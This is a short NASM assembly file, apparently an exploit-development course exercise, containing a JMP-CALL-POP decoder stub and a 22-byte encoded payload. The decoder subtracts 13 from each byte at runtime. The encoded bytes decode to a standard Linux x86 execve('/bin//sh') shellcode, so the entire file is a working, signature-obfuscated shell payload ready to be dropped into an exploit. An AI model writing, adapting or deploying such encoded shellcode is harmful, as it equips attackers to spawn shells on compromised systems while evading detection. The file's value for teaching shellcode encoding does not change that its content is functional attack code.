; Filename:	encoder.nasm
; Author:	Jules Adriaens
; Assemble:	nasm -f elf32 -o encoder.o encoder.nasm
; Link:		ld -o encoder encoder.o

global _start

section .text

_start:
	jmp short call_shellcode	; JMP-call-pop

decoder:
	pop esi				; jmp-call-POP
	xor eax, eax			; EAX = 0
	mov al, 22			; shellcode length

decode:
	sub byte [esi], 13		; decode byte
	dec al				; shellcode length -1
	jz encoded			; if shellcode length == 0
	inc esi				; ESI +1
	jmp short decode		; rinse repeat

call_shellcode:
	call decoder			; jmp-CALL-pop
	encoded: db 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d
